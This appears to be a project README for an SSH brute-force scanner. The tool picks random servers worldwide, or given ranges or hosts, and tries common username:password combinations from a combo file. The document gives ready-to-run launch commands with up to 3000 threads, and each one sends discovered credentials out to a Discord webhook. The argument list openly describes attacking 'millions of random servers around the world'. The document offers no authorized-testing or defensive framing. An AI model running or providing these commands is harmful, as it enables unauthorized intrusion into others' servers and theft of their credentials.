## Description
This tool scans random SSH servers around the world and it tests the most used passwords

## Developers

You can reuse SSHScanner but make sure you comply with the [LICENSE](https://github.com/thisisnzed/SSHScanner/blob/main/LICENSE).

### Maven

```xml
<dependencies>
    <dependency>
        <groupId>com.thisisnzed</groupId>
        <artifactId>SSHScanner</artifactId>
        <version>1.1.0-SNAPSHOT</version>
    </dependency>
</dependencies>
```

## Lib

* **JSch** : http://www.jcraft.com/jsch/ 

## Usage

* I. Download the [latest release](https://github.com/thisisnzed/SSHScanner/releases) of SSHScanner
* II. Launch the program 

## Launch

*Here are some examples of commands according to your need*

**Scan random SSH servers :** java -jar SSHScanner.jar -combo combo.txt -threads 1 -port 22 -timeout 6000 -webhook "https://discord.com/api/webhooks/x/y" -verbose true
**Scan SSH range :** java -jar SSHScanner.jar -range range.txt -combo combo.txt -threads 3000 -port 22 -timeout 6000 -webhook "https://discord.com/api/webhooks/x/y" -verbose false
**Scan specific SSH server :** java -jar SSHScanner.jar -combo combo.txt -threads 1 -port 22 -timeout 6000 -webhook "https://discord.com/api/webhooks/x/y" -verbose true -host "127.0.0.1"


## Arguments

Note: Each argument is optional

* **-combo <path>** | File containing all the "user:password" that the program will test for each host (default: combo.txt)
* **-threads <int>** | Number of threads launched (default: 1)
* **-port <int>** | Port that will be tested for each host (default: 22)
* **-timeout <int>** | Time (in ms) before the program marks a server as unavailable (default: 6000)
* **-webhook <url>** | Discord webhook where credentials will be sent (default: "")
* **-verbose <boolean>** | Whether or not to display failed attempts on the console (default: true)
* **-host <IP address>** | **WARNING: Only for bruteforce specific host** | Use this parameter ONLY if you want to perform a bruteforce attack on a specific SSH server - if you use this parameter you only will attack the requested server and not millions of random servers around the world (default: "")
* **-range <path>** | **WARNING: Only for bruteforce specifics ranges** | Use this parameter ONLY if you want to perform a bruteforce attack on specifics SSH servers (by putting ranges) - if you use this parameter you only will attack the requested ranges and not millions of random servers around the world (default: "")

